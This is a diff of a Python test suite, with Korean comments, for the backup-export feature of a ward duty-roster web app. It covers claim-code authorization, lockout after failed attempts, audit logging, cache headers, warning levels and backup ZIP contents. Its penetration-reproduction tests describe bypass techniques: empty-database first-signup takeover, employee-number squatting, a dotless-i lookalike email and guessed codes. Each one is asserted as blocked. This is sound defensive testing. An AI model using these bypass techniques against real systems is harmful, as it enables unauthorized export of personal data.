+        assert client.get(STATUS_URL, headers=_h(user["token"])).status_code == 403
+    _grant(client, people.owner, code)
     assert client.get(STATUS_URL, headers=_h(people.owner["token"])).status_code == 200
-    for who in (people.admin, people.staff, people.other):
-        assert client.get(STATUS_URL, headers=_h(who["token"])).status_code == 403
 
 
-def test_ac1_no_store_on_all_three_endpoints(client, people, monkeypatch):
-    """보완 지시 필수 4-1: 백업 3개 엔드포인트 응답에 `Cache-Control: no-store`.
+def test_no_store_on_every_backup_endpoint(client, people, code):
+    """전체 DB 사본·경고 상태가 브라우저 캐시에 남지 않는다(보완 지시 필수 4-1)."""
+    claim_resp = _grant(client, people.owner, code)
+    r, bid = _download(client, people.owner)
+    conf = _confirm(client, people.owner, bid, len(r.content))
+    stat = client.get(STATUS_URL, headers=_h(people.owner["token"]))
+    for name, resp in (("claim", claim_resp), ("backup", r),
+                       ("confirm", conf), ("status", stat)):
+        assert "no-store" in resp.headers.get("cache-control", "").lower(), \
+            f"{name} 응답에 Cache-Control: no-store 없음: {dict(resp.headers)}"
 
-    전체 DB 사본이 브라우저·중간 캐시에 남으면 안 된다.
+
+# ==================== G-2. 실패 잠금 (5회 → 15분 429) ====================
+
+def test_lock_after_five_failures(client, people, code):
+    """정답을 모른 채 5회 실패하면 6번째부터 429."""
+    import app.backup as backup
+
+    assert backup.CLAIM_MAX_FAILS == 5, f"실패 허용 횟수가 기준과 다름: {backup.CLAIM_MAX_FAILS}"
+    assert backup.CLAIM_LOCK_SEC == 15 * 60, f"잠금 시간이 기준(15분)과 다름: {backup.CLAIM_LOCK_SEC}"
+    for i in range(5):
+        r = _claim(client, people.owner, _new_claim_code())
+        assert r.status_code == 403, f"{i + 1}번째 실패가 403이 아님: {r.status_code}"
+    r = _claim(client, people.owner, _new_claim_code())
+    assert r.status_code == 429, f"6번째 시도가 잠기지 않음: {r.status_code} {r.text[:200]}"
+
+
+def test_lock_beats_the_correct_code(client, people, code):
+    """**잠긴 상태에서는 정답 코드도 429** — 잠금이 정답보다 우선한다."""
+    for _ in range(5):
+        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
+    r = _claim(client, people.owner, code)
+    assert r.status_code == 429, f"잠금 중 정답이 통과했다: {r.status_code} {r.text[:200]}"
+    assert _flag_of(people.owner) == 0, "잠금 중인데 권한 플래그가 켜졌다"
+    assert client.get(BACKUP_URL, headers=_h(people.owner["token"])).status_code == 403
+
+
+def test_lock_expires_after_window(client, people, code, monkeypatch):
+    """잠금 시간이 지나면 풀린다 — 영구 잠금이 아니다.
+
+    실제 15분을 기다리지 않으려고 잠금 길이만 0초로 바꿔 만료 후 동작을 본다
+    (기본값이 15분인 것은 위 테스트가 상수로 고정한다).
     """
-    _allow_uid(monkeypatch, _uid(people.owner))
-    dl, bid = _download(client, people.owner)
-    conf = _confirm(client, people.owner, bid, len(dl.content))
+    import app.backup as backup
+
+    monkeypatch.setattr(backup, "CLAIM_LOCK_SEC", 0)
+    for _ in range(5):
+        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
+    _grant(client, people.owner, code)
+
+
+def test_lock_counter_is_lost_on_process_restart(client, people, code):
+    """**알려진 한계(결함 아님·설계 수용)**: 잠금 카운터는 프로세스 메모리다.
+
+    재시작하면 카운터가 초기화되어 잠금이 풀린다. 지금은 이것이 의도된 동작이므로
+    사실 그대로 고정해 둔다 — 나중에 잠금을 영속화하면 **이 테스트가 실패하고**,
+    그때 이 테스트를 "재시작해도 잠금 유지"로 바꾸면 된다(판별력 보존).
+    """
+    import app.backup as backup
+
+    for _ in range(5):
+        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
+    assert _claim(client, people.owner, code).status_code == 429
+    backup._claim_fails.clear()  # = 프로세스 재시작(메모리 카운터 소멸)
+    r = _claim(client, people.owner, code)
+    assert r.status_code == 200, (
+        "재시작 후에도 잠금이 유지된다 — 잠금이 영속화된 것으로 보인다. "
+        "설계가 바뀐 것이라면 이 테스트를 '유지'로 갱신할 것.")
+
+
+def test_failed_claims_are_logged_as_denied_once_per_day(client, people, code):
+    """실패는 `denied`로 남되 **uid별 하루 1행**으로 합쳐진다."""
+    for _ in range(4):
+        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
+    rows = _rows_with("denied")
+    actor = f"uid:{_uid_of(people.owner)}"
+    mine = [r for r in rows if r["actor"] == actor]
+    assert len(mine) == 1, f"실패 4회가 {len(mine)}행으로 남음(1행이어야 함): {rows}"
+    assert mine[0]["byte_size"] == 0
+    for leak in (OWNER.name, OWNER.empno, OWNER.email):
+        assert leak not in json.dumps(mine[0], ensure_ascii=False), \
+            f"거부 이력에 개인정보: {leak}"
+
+
+def test_denied_rows_are_separate_per_account(client, people, code):
+    """계정이 다르면 거부 이력도 따로 남는다(누가 두드렸는지 구분 가능)."""
+    _claim(client, people.owner, _new_claim_code())
+    _claim(client, people.other, _new_claim_code())
+    client.get(BACKUP_URL, headers=_h(people.staff["token"]))
+    actors = {r["actor"] for r in _rows_with("denied")}
+    expected = {f"uid:{_uid_of(u)}" for u in (people.owner, people.other, people.staff)}
+    assert expected <= actors, f"거부 이력이 계정별로 남지 않음: {actors} vs {expected}"
+
+
+def test_lock_also_applies_to_the_same_source_ip(client, people, code):
+    """설계 수용 문서화: 잠금 키에는 출처 IP도 들어간다.
+
+    같은 IP에서 5회 실패하면 **다른 계정도** 15분간 막힌다(프록시 뒤 공용 NAT에서
+    서로를 잠글 수 있음 — 대신 대입 공격이 계정을 바꿔가며 이어가지 못한다).
+    """
+    for _ in range(5):
+        assert _claim(client, people.owner, _new_claim_code()).status_code == 403
+    r = _claim(client, people.other, code)
+    assert r.status_code == 429, (
+        f"같은 IP의 다른 계정이 곧바로 시도할 수 있다: {r.status_code} — "
+        "IP 축 잠금이 사라졌는지 확인할 것")
+
+
+# ==================== G-3. 침투 재현 (품질부가 직접 수행) ====================
+
+def test_pen_first_signup_on_empty_db_cannot_export(client, env, monkeypatch):
+    """**최우선**: 빈 DB에서 공격자가 첫 가입자(uid 1, master)가 되어도 백업 403.
+
+    직전 라운드에서 실제로 뚫린 경로다 — 볼륨을 잃어 DB가 초기화되면 첫 가입자가
+    uid 1을 물려받아 환경변수에 적힌 권한을 **상속**했다. 권한이 계정 플래그로
+    옮겨간 뒤에는 초기화와 함께 플래그도 사라져야 하고, 코드를 모르면 되살릴 수 없다.
+    """
+    # 운영자는 코드를 설정해 둔 상태(공격자는 그 값을 모른다).
+    real_code = _new_claim_code()
+    monkeypatch.setenv(CLAIM_ENV, real_code)
+
+    attacker = _reg(client, email="attacker@duty.kr", empno="998001",
+                    name="가명공격자", ward="61")
+    assert attacker["role"] == "master", "첫 가입자는 그 병동의 master가 된다(전제)"
+    assert _uid_of(attacker) == 1, "빈 DB의 첫 가입자는 uid 1이어야 한다(전제 확인)"
+
+    r = client.get(BACKUP_URL, headers=_h(attacker["token"]))
+    assert r.status_code == 403, f"uid 1 master가 백업을 가져갔다: {r.status_code}"
+    assert r.content[:2] != b"PK"
+    assert _flag_of(attacker) == 0
+
+    # 코드를 모르면 스스로 권한을 켤 수도 없다.
+    for guess in ("password", "duty2026", "backup-code", "00000000", real_code[:-1]):
+        assert _claim(client, attacker, guess).status_code in (403, 429), \
+            f"추측 코드 {guess!r}로 권한이 켜졌다"
+    assert _flag_of(attacker) == 0
+    assert client.get(BACKUP_URL, headers=_h(attacker["token"])).status_code == 403
+
+
+def test_pen_empno_squatting_grants_nothing(client, env, monkeypatch):
+    """사번 선점 — 운영자가 쓸 사번을 먼저 차지해도 권한은 따라오지 않는다."""
+    monkeypatch.setenv(CLAIM_ENV, _new_claim_code())
+    squatter = _reg(client, email="squat@duty.kr", empno=OWNER.empno,
+                    name="가명선점자", ward="70")
+    assert squatter["role"] == "master"
+    r = client.get(BACKUP_URL, headers=_h(squatter["token"]))
+    assert r.status_code == 403, f"사번 선점으로 백업이 열렸다: {r.status_code}"
+    # 옛 방식(문자열 사번 allowlist)을 흉내 낸 환경변수를 켜도 마찬가지다.
+    monkeypatch.setenv(LEGACY_STR_ENV, OWNER.empno)
+    assert client.get(BACKUP_URL, headers=_h(squatter["token"])).status_code == 403
+
+
+def test_pen_unicode_dotless_i_lookalike_denied(client, env, monkeypatch, code):
+    """유니코드 접힘(ı, U+0131) 계정 — 여전히 막힌다.
+
+    `"ı".upper() == "I"` 라서 대문자 비교를 쓰던 옛 방식에서는 **다른 이메일**이
+    허가 계정으로 접혀 통과했다.
+    """
+    owner = _reg(client, email="kim.min@duty.kr", empno="990101", name="김서연", ward="61")
+    _grant(client, owner, code)
+    lookalike = _reg(client, email="kım.mın@duty.kr", empno="998002",
+                     name="가명유사자", ward="71")
+    assert lookalike["role"] == "master"
+    assert lookalike["_pw"] == owner["_pw"]  # 같은 비밀번호라도 다른 계정
+    r = client.get(BACKUP_URL, headers=_h(lookalike["token"]))
+    assert r.status_code == 403, f"유니코드 유사 이메일이 통과했다: {r.status_code}"
+    assert _flag_of(lookalike) == 0
+    # 원래 소유자의 권한은 그대로여야 한다(오탐으로 잠기지 않았는지).
+    assert client.get(BACKUP_URL, headers=_h(owner["token"])).status_code == 200
+
+
+@pytest.mark.parametrize("value", ["1", "1,2,3", " 1 , 2 ", "0", "-1", "abc", "",
+                                   "1;2", "999999"])
+def test_legacy_uid_env_has_no_effect(client, people, monkeypatch, value):
+    """제거된 `DUTY_BACKUP_OWNER_UID` — 어떤 값을 넣어도 아무도 통과하지 못한다."""
+    monkeypatch.setenv(LEGACY_UID_ENV, value)
+    for user in (people.owner, people.admin, people.staff, people.other):
+        r = client.get(BACKUP_URL, headers=_h(user["token"]))
+        assert r.status_code == 403, f"{LEGACY_UID_ENV}={value!r} 로 {r.status_code}"
+        assert r.content[:2] != b"PK"
+
+
+@pytest.mark.parametrize("value", ["seoyeon@duty.kr", "990001", "990001,jiwoo@duty.kr",
+                                   "SEOYEON@DUTY.KR", "*"])
+def test_legacy_string_env_has_no_effect(client, people, monkeypatch, value):
+    """제거된 `DUTY_BACKUP_OWNER`(사번·이메일) — 설정해도 무효."""
+    monkeypatch.setenv(LEGACY_STR_ENV, value)
+    for user in (people.owner, people.admin, people.staff, people.other):
+        assert client.get(BACKUP_URL, headers=_h(user["token"])).status_code == 403
+
+
+def test_flag_disappears_with_database_reset(client, env, monkeypatch, tmp_path):
+    """DB가 초기화되면 권한도 함께 사라진다 — D-19 전환의 존재 이유.
+
+    (재등록이 필요한 것은 결함이 아니라 설계다.)
+    """
+    real_code = _new_claim_code()
+    monkeypatch.setenv(CLAIM_ENV, real_code)
+    owner = _reg(client, email=OWNER.email, empno=OWNER.empno, name=OWNER.name, ward="61")
+    _grant(client, owner, real_code)
+    assert client.get(BACKUP_URL, headers=_h(owner["token"])).status_code == 200
+
+    # 볼륨 분실 = 새 빈 DB. 이후 첫 가입자가 uid 1을 물려받는다.
+    fresh_db = tmp_path / "dbdir" / "reset.db"
+    monkeypatch.setenv("DUTY_DB", str(fresh_db))
+    newcomer = _reg(client, email="newcomer@duty.kr", empno="998003",
+                    name="가명신규", ward="61")
+    assert _uid_of(newcomer) == 1
+    assert client.get(BACKUP_URL, headers=_h(newcomer["token"])).status_code == 403, \
+        "초기화된 DB의 첫 가입자가 권한을 상속했다"
+    # 코드를 아는 운영자만 다시 켤 수 있다.
+    _grant(client, newcomer, real_code)
+    assert client.get(BACKUP_URL, headers=_h(newcomer["token"])).status_code == 200
+
+
+# ==================== 이력 3단계 (pending → 사람 확인 → confirm) ====================
+
+def test_download_creates_pending_row_with_header_id(client, owner_ok):
+    """내려받기는 `pending` 행 1개 + `X-Backup-Id` 헤더를 남긴다(아직 성공 아님)."""
+    r, bid = _download(client, owner_ok)
+    rows = _log_rows()
+    assert len(rows) == 1, f"행이 1개가 아님: {rows}"
+    row = rows[0]
+    assert row["id"] == bid, f"헤더 id({bid})와 기록 id({row['id']})가 다름"
+    assert row["status"] == "pending", f"확정 전인데 status={row['status']}"
+    assert row["actor"] == f"uid:{_uid_of(owner_ok)}", f"actor 형식이 uid가 아님: {row}"
+    assert row["byte_size"] == len(r.content), "pending 행에 실제 크기가 기록되지 않음"
+    assert int(r.headers["x-backup-bytes"]) == len(r.content)
+
+
+def test_pending_alone_is_not_a_success(client, owner_ok):
+    """브라우저가 파일을 저장하지 못하면(=confirm 없음) 경고가 꺼지면 안 된다."""
+    _download(client, owner_ok)
+    body = _status(client, owner_ok)
+    assert body["level"] == "critical", f"pending만 있는데 level={body['level']}"
+    assert body["last_backup_at"] is None
+    assert body["days_since"] is None
+
+
+def test_confirm_marks_ok_and_clears_warning(client, owner_ok):
+    """사람이 [확인했습니다]를 누른 뒤에야 `ok` 1행 + level=ok."""
+    r, bid = _download(client, owner_ok)
+    conf = _confirm(client, owner_ok, bid, len(r.content))
     assert conf.status_code == 200, conf.text
-    st = client.get(STATUS_URL, headers=_h(people.owner["token"]))
-    for label, r in (("backup", dl), ("confirm", conf), ("status", st)):
-        cc = r.headers.get("cache-control", "")
-        assert "no-store" in cc.lower(), f"{label} 응답에 no-store 없음: {cc!r}"
+    rows = _log_rows()
+    assert len(rows) == 1 and rows[0]["status"] == "ok", rows
+    assert rows[0]["byte_size"] > 0
+    body = _status(client, owner_ok)
+    assert body["level"] == "ok" and body["days_since"] == 0, body
+    assert conf.json()["level"] == "ok"
 
 
-# ==================== 침투 재현 시험 (검수부 ①이 뚫었던 두 경로) ====================
+def test_confirm_size_mismatch_is_400_and_stays_pending(client, owner_ok):
+    """받은 크기가 다르면 400 — 부분 전달을 성공으로 기록하지 않는다."""
+    r, bid = _download(client, owner_ok)
+    for wrong in (len(r.content) - 1, len(r.content) + 1, 0):
+        bad = _confirm(client, owner_ok, bid, wrong)
+        assert bad.status_code == 400, f"크기 {wrong}인데 {bad.status_code}"
+    rows = _log_rows()
+    assert rows[-1]["status"] == "pending", f"실패한 확정이 상태를 바꿨다: {rows}"
+    assert _status(client, owner_ok)["level"] == "critical"
 
-def test_pen_empno_squatting_no_longer_grants_access(client, people, monkeypatch):
-    """(a) 선점: 아직 아무 계정에도 묶이지 않은 '허가 문자열'을 가로채기.
 
-    옛 방식에서는 `DUTY_BACKUP_OWNER=990777`을 먼저 설정해 둔 상태에서 누구나
-    그 사번으로 새 병동을 열어 master가 되면 전체 DB를 반출할 수 있었다.
-    uid 방식에서는 공격자가 자기 users.id를 고를 수 없으므로 막혀야 한다.
+def test_confirm_of_another_users_row_is_404(client, people, code):
+    """남의 pending 행은 확정할 수 없다(id를 알아도)."""
+    _grant(client, people.owner, code)
+    _grant(client, people.other, code)
+    r, bid = _download(client, people.owner)
+    other = _confirm(client, people.other, bid, len(r.content))
+    assert other.status_code == 404, f"남의 행을 확정했다: {other.status_code}"
+    rows = [x for x in _log_rows() if x["id"] == bid]
+    assert rows[0]["status"] == "pending", f"남이 확정해 상태가 바뀜: {rows}"
+    mine = _confirm(client, people.owner, bid, len(r.content))
+    assert mine.status_code == 200
+
+
+def test_confirm_unknown_id_is_404(client, owner_ok):
+    assert _confirm(client, owner_ok, 99999, 10).status_code == 404
+
+
+def test_confirm_is_idempotent(client, owner_ok):
+    """같은 확정을 두 번 보내도 200이고 `ok` 행은 그대로 1개."""
+    r, bid = _download(client, owner_ok)
+    first = _confirm(client, owner_ok, bid, len(r.content))
+    second = _confirm(client, owner_ok, bid, len(r.content))
+    assert (first.status_code, second.status_code) == (200, 200), \
+        (first.status_code, second.status_code)
+    assert len(_rows_with("ok")) == 1, _log_rows()
+
+
+def test_denied_export_attempts_are_logged(client, people, code):
+    """반출 시도 거부는 `denied`로 남는다(침입 탐지 수단)."""
+    _grant(client, people.owner, code)
+    for _ in range(3):
+        assert client.get(BACKUP_URL, headers=_h(people.staff["token"])).status_code == 403
+    denied = _rows_with("denied")
+    actor = f"uid:{_uid_of(people.staff)}"
+    assert [d["actor"] for d in denied] == [actor], f"거부 이력이 1행이 아님: {denied}"
+
+
+def test_status_check_by_non_owner_leaves_no_log_row(client, people, code):
+    """화면이 카드를 그릴지 판단하려고 호출하는 /status 거부는 이력에 남기지 않는다.
+
+    (남기면 정상 이용이 전부 '침입 시도'로 쌓여 로그가 무의미해진다.)
     """
-    monkeypatch.setenv(LEGACY_ENV, "990777")           # 옛 배포 문서가 안내하던 순서
-    _allow_uid(monkeypatch, _uid(people.owner))         # 새 방식의 정상 설정
-
-    attacker = _reg(client, empno="990777", name="침입자가명", ward="77")
-    assert attacker["role"] == "master", "새 병동 개설자는 master가 된다(전제)"
-    assert _uid(attacker) != _uid(people.owner), "공격자가 허가 uid를 얻으면 안 된다"
-
-    r = client.get(BACKUP_URL, headers=_h(attacker["token"]))
-    assert r.status_code == 403, f"사번 선점으로 백업이 열림: {r.status_code}"
-    assert client.get(STATUS_URL, headers=_h(attacker["token"])).status_code == 403
+    _grant(client, people.owner, code)
+    for user in (people.staff, people.admin, people.other):
+        assert client.get(STATUS_URL, headers=_h(user["token"])).status_code == 403
+    assert _rows_with("denied") == [], f"status 거부가 이력에 남았다: {_log_rows()}"
 
 
-def test_pen_unicode_case_folding_lookalike_denied(client, monkeypatch):
-    """(b) 유니코드 접힘: 점 없는 ı(U+0131)가 대문자화하면 'I'로 접힌다.
-
-    옛 방식은 저장은 lower(), 비교는 upper()라 `mina@…`와 `mına@…`가 같은
-    대문자열로 접혀 allowlist를 통과했다. uid 판정에서는 막혀야 한다.
-    """
-    victim_email = "mina@duty.kr"
-    lookalike_email = "mına@duty.kr"  # 'i' → 'ı'(U+0131)
-    assert victim_email != lookalike_email
-    assert victim_email.upper() == lookalike_email.upper(), (
-        "테스트 자기검증 실패: 대문자 접힘 충돌을 만들지 못함 "
-        f"({victim_email.upper()!r} vs {lookalike_email.upper()!r})")
-
-    victim = _reg(client, email=victim_email, name="정다은", ward="61")
-    assert victim["role"] == "master"
-    attacker = _reg(client, email=lookalike_email, name="유사계정가명", ward="88")
-    assert attacker["role"] == "master"
-
-    monkeypatch.setenv(LEGACY_ENV, victim_email)    # 옛 변수가 남아 있어도
-    _allow_uid(monkeypatch, _uid(victim))           # 판정은 uid로만
-
-    r = client.get(BACKUP_URL, headers=_h(attacker["token"]))
-    assert r.status_code == 403, f"유니코드 접힘으로 백업이 열림: {r.status_code}"
-    assert client.get(STATUS_URL, headers=_h(attacker["token"])).status_code == 403
-    # 대조군: 진짜 허가 계정은 통과해야 한다.
-    assert client.get(BACKUP_URL, headers=_h(victim["token"])).status_code == 200
+def test_denied_last_30d_counts_recent_only(client, owner_ok):
+    """/status 의 `denied_last_30d` — 최근 30일(KST) 거부 시도 수."""
+    uid = _uid_of(owner_ok)
+    _insert_log_row(_kst_days_ago(1), status="denied", uid=uid + 10, size=0)
+    _insert_log_row(_kst_days_ago(29), status="denied", uid=uid + 11, size=0)
+    _insert_log_row(_kst_days_ago(45), status="denied", uid=uid + 12, size=0)
+    body = _status(client, owner_ok)
+    assert body["denied_last_30d"] == 2, \
+        f"최근 30일 거부 수가 2가 아님: {body} / {_log_rows()}"
 
 
-# ============================ 수용 기준 2 — 일관성 ============================
+# ==================== 경고 단계(level) — ok 행만 센다 ====================
 
-def test_ac2_row_committed_before_backup_is_in_db_and_csv(client, people, monkeypatch, tmp_path):
-    """백업 직전 커밋된 행이 ZIP의 duty.db와 해당 CSV **양쪽**에 있다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    marker = "백업직전-정합성표식-한글확인"
-    _feedback(client, people.staff, marker)
-
-    zf = _zip_of(client.get(BACKUP_URL, headers=_h(people.owner["token"])))
-
-    # (1) duty.db 쪽
-    path = _extract_db(zf, tmp_path)
-    conn = sqlite3.connect(path)
-    try:
-        rows = conn.execute("SELECT message, from_name FROM feedback").fetchall()
-    finally:
-        conn.close()
-    assert any(r[0] == marker for r in rows), f"duty.db에 직전 커밋 행 없음: {rows}"
-    assert any(r[1] == STAFF.name for r in rows), "duty.db에서 한글 이름이 깨짐"
-
-    # (2) CSV 쪽
-    text = zf.read("tables/feedback.csv").decode("utf-8-sig")
-    assert marker in text, f"feedback.csv에 직전 커밋 행 없음: {text[:300]}"
-    assert STAFF.name in text, "CSV에서 한글 이름이 깨짐"
+def test_no_history_is_critical(client, owner_ok):
+    _set_last_backup(None)
+    body = _status(client, owner_ok)
+    assert body["level"] == "critical" and body["last_backup_at"] is None, body
 
 
-def test_ac2_original_db_usable_during_and_after_backup(client, people, monkeypatch):
-    """백업 중·후에도 원본 DB 읽기·쓰기가 계속 성공한다(WAL 스냅샷이 원본을 막지 않음)."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    db = os.environ["DUTY_DB"]
-
-    # 백업이 순식간에 끝나 '동시성'이 검증되지 않는 것을 막기 위해 사전에 덩치를 키운다.
-    seed = _db()
-    try:
-        seed.executemany(
-            "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
-            "VALUES (?,?,?,?,?)",
-            [("61", STAFF.email, STAFF.name, f"사전적재-{i}-" + "가" * 200,
-              datetime.now(timezone.utc).isoformat()) for i in range(20000)])
-        seed.commit()
-    finally:
-        seed.close()
-
-    errors: list[str] = []
-    counter = {"writes": 0, "reads": 0}
-    stop = threading.Event()
-
-    def worker():
-        conn = sqlite3.connect(db, timeout=15)
-        conn.execute("PRAGMA busy_timeout=15000")
-        try:
-            while not stop.is_set():
-                conn.execute(
-                    "INSERT INTO feedback (ward, from_email, from_name, message, created_at) "
-                    "VALUES (?,?,?,?,?)",
-                    ("61", STAFF.email, STAFF.name, "동시쓰기",
-                     datetime.now(timezone.utc).isoformat()))
-                conn.commit()
-                counter["writes"] += 1
-                conn.execute("SELECT COUNT(*) FROM feedback").fetchone()
-                counter["reads"] += 1
-        except Exception as exc:  # noqa: BLE001 — 실패 원문을 그대로 보고한다
-            errors.append(repr(exc))
-        finally:
-            conn.close()
-
-    t = threading.Thread(target=worker, daemon=True)
-    t.start()
-    try:
-        before = counter["writes"]
-        resp = client.get(BACKUP_URL, headers=_h(people.owner["token"]))
-        during = counter["writes"] - before
-    finally:
-        stop.set()
-        t.join(timeout=20)
-
-    assert not errors, f"백업 중 원본 DB 접근 실패: {errors[:3]}"
-    assert resp.status_code == 200, f"{resp.status_code} {resp.text[:300]}"
-    assert during > 0, "백업 요청이 진행되는 동안 원본 DB에 쓴 기록이 0건(동시성 미검증)"
-
-    # 백업 후에도 API 읽기·쓰기가 정상
-    _feedback(client, people.staff, "백업후-쓰기")
-    got = client.get("/api/feedback", headers=_h(people.owner["token"]))
-    assert got.status_code == 200, got.text
-    assert client.get("/api/roster", headers=_h(people.owner["token"])).status_code == 200
+@pytest.mark.parametrize("days,level", [
+    (0, "ok"), (1, "ok"), (29, "ok"), (30, "warn"), (31, "warn"),
+    (44, "warn"), (45, "critical"), (60, "critical")])
+def test_level_thresholds_by_kst_elapsed_days(client, owner_ok, days, level):
+    """KST 경과일 29→ok / 30→warn / 45→critical."""
+    _set_last_backup(_kst_days_ago(days))
+    body = _status(client, owner_ok)
+    assert body["days_since"] == days, f"경과일 {body['days_since']} != {days} ({body})"
+    assert body["level"] == level, f"{days}일 → {body['level']} (기대 {level})"
 
 
-# ============================ 수용 기준 3 — 산출물 ============================
+@pytest.mark.parametrize("days,level", [(29, "ok"), (30, "warn"), (45, "critical")])
+def test_boundary_uses_kst_not_utc(client, owner_ok, days, level):
+    """UTC 달력으로 세면 결과가 달라지는 시각에서도 KST 결과가 나온다(교훈 L-4)."""
+    dt = _kst_days_ago(days, flip_utc_date=True)
+    utc_days = _utc_date_diff(dt)
+    assert utc_days != days, f"테스트 자기검증 실패: UTC 경과일({utc_days})이 KST와 같음"
+    _set_last_backup(dt)
+    body = _status(client, owner_ok)
+    assert body["days_since"] == days, f"KST 경과일이 아님: {body} (UTC로는 {utc_days})"
+    assert body["level"] == level, body
 
-def test_ac3_zip_contains_db_seven_csv_and_readme(client, people, monkeypatch, tmp_path):
-    """ZIP = duty.db 1개 + tables/*.csv 7개 + README.txt, 그 외 없음."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    zf = _zip_of(client.get(BACKUP_URL, headers=_h(people.owner["token"])))
+
+@pytest.mark.parametrize("status", ["pending", "fail", "denied", "archived"])
+def test_level_counts_ok_rows_only(client, owner_ok, status):
+    """`ok`가 아닌 행(pending·fail·denied·**archived**)은 경고를 끄지 못한다."""
+    _set_last_backup(_kst_days_ago(0), status=status)
+    body = _status(client, owner_ok)
+    assert body["level"] == "critical", f"status={status} 행이 경고를 껐다: {body}"
+    assert body["last_backup_at"] is None, body
+
+
+def test_future_ok_row_alone_is_critical(client, owner_ok):
+    """미래 시각 `ok` 행(시계 역행·조작)은 신뢰하지 않는다 — critical."""
+    _set_last_backup(datetime.now(KST) + timedelta(days=3))
+    body = _status(client, owner_ok)
+    assert body["level"] == "critical", f"미래 시각 행이 안전으로 읽혔다: {body}"
+
+
+def test_new_backup_overrides_a_future_row(client, owner_ok):
+    """**기록 순서(id)** 로 최신 행을 고른다 — 미래 시각 행이 있어도 이후 정상 백업이
+    경고를 끌 수 있어야 한다(created_at 정렬이면 영원히 빠져나오지 못한다)."""
+    _set_last_backup(datetime.now(KST) + timedelta(days=30))
+    assert _status(client, owner_ok)["level"] == "critical"
+    _full_backup(client, owner_ok)
+    body = _status(client, owner_ok)
+    assert body["level"] == "ok", f"정상 백업을 했는데도 {body}"
+    assert body["days_since"] == 0, body
+
+
+def test_level_for_unit_boundaries():
+    """단위 함수 경계 — 29/30/44/45, 음수·미상."""
+    from app.backup import level_for
+
+    assert (level_for(0), level_for(29)) == ("ok", "ok")
+    assert (level_for(30), level_for(44)) == ("warn", "warn")
+    assert (level_for(45), level_for(10000)) == ("critical", "critical")
+    assert level_for(None) == "critical"
+    for negative in (-1, -30):
+        assert level_for(negative) == "critical", f"{negative}일이 critical이 아님"
+
+
+# ==================== 산출물 구성 (ZIP / CSV / README) ====================
+
+def test_zip_contains_db_seven_csv_and_readme(client, owner_ok, tmp_path):
+    """ZIP = duty.db 1개 + CSV 7개 + README.txt (수용 기준 3)."""
+    _feedback(client, owner_ok, "백업 확인용 피드백")
+    r, _ = _download(client, owner_ok)
+    zf = _zip_of(r)
     names = set(zf.namelist())
-
-    csv_tables = _csv_names(zf)
-    assert len(csv_tables) == 7, f"CSV가 7개가 아님({len(csv_tables)}): {sorted(csv_tables)}"
-    assert csv_tables == EXPECTED_CSV_TABLES, f"CSV 대상 테이블 불일치: {sorted(csv_tables)}"
-    assert names == {"duty.db", "README.txt"} | {f"tables/{t}.csv" for t in EXPECTED_CSV_TABLES}, \
-        f"ZIP 구성 불일치: {sorted(names)}"
-
-    # 복구 정본 duty.db는 열 수 있는 SQLite여야 하고, backup_log까지 들어 있어야 한다
-    # (CSV에서 뺀 대신 정본에는 남아야 손실이 없다).
-    path = _extract_db(zf, tmp_path)
-    conn = sqlite3.connect(path)
+    assert "duty.db" in names and "README.txt" in names, names
+    assert _csv_names(zf) == EXPECTED_CSV_TABLES, \
+        f"CSV 테이블 구성이 다름: {sorted(_csv_names(zf))}"
+    restored = _extract_db(zf, tmp_path)
+    conn = sqlite3.connect(restored)
     try:
-        assert conn.execute("PRAGMA integrity_check").fetchone()[0] == "ok"
-        tables = {r[0] for r in conn.execute(
-            "SELECT name FROM sqlite_master WHERE type='table'")}
-    finally:
-        conn.close()
-    assert EXPECTED_CSV_TABLES <= tables, f"duty.db에 누락 테이블: {EXPECTED_CSV_TABLES - tables}"
-    assert "backup_log" in tables, "복구 정본 duty.db에 backup_log가 없음"
-    # 스키마가 늘었는데 CSV가 따라오지 않으면 알아채야 한다.
-    app_tables = {t for t in tables if not t.startswith("sqlite_")} - {"backup_log"}
-    assert app_tables == csv_tables, f"CSV로 안 빠진 테이블: {sorted(app_tables - csv_tables)}"
-
-
-def test_ac3_every_csv_starts_with_utf8_bom_and_keeps_korean(client, people, monkeypatch, tmp_path):
-    """CSV 첫 3바이트가 UTF-8 BOM이고, 데이터의 한글이 깨지지 않는다."""
-    _allow_uid(monkeypatch, _uid(people.owner))
-    _feedback(client, people.staff, "한글 데이터 보존 확인 — 김서연·박하늘")
-    nurses = [{"id": "n1", "name": "정다은", "team": 1, "seniority_rank": 1}]
-    assert client.put("/api/roster", json={"nurses": nurses},
-                      headers=_h(people.owner["token"])).status_code == 200
-
-    zf = _zip_of(client.get(BACKUP_URL, headers=_h(people.owner["token"])))
-    path = _extract_db(zf, tmp_path)
-    conn = sqlite3.connect(path)
-
-    try:
-        for table in sorted(EXPECTED_CSV_TABLES):
-            raw = zf.read(f"tables/{table}.csv")
-            assert raw[:3] == BOM, f"{table}.csv 첫 3바이트가 BOM이 아님: {raw[:6]!r}"
-            text = raw.decode("utf-8-sig")  # 깨졌으면 여기서 예외
-            rows = list(csv.reader(io.StringIO(text)))
-            assert rows, f"{table}.csv 가 비어 있음(헤더도 없음)"
-            cols = [r[1] for r in conn.execute(f"PRAGMA table_info({table})")]
-            assert rows[0] == cols, f"{table}.csv 헤더가 컬럼명과 다름: {rows[0]} != {cols}"
-            db_count = conn.execute(f"SELECT COUNT(*) FROM {table}").fetchone()[0]
-            assert len(rows) - 1 == db_count, \
-                f"{table}.csv 행 수 불일치: CSV {len(rows) - 1} != duty.db {db_count}"
+        assert str(conn.execute("PRAGMA quick_check").fetchone()[0]).lower() == "ok"
+        assert conn.execute("SELECT COUNT(*) FROM users").fetchone()[0] >= 1
     finally:
         conn.close()
 
-    # 한글이 실제로 살아 있는지(모지바케·물음표 치환 없이)
-    users_csv = zf.read("tables/users.csv").decode("utf-8-sig")
-    for name in (OWNER.name, ADMIN.name, STAFF.name):
-        assert name in users_csv, f"users.csv에서 한글 이름 유실: {name}"
-    assert "정다은" in zf.read("tables/rosters.csv").decode("utf-8-sig")
-    assert "�" not in users_csv, "users.csv에 치환 문자(U+FFFD)가 있음"
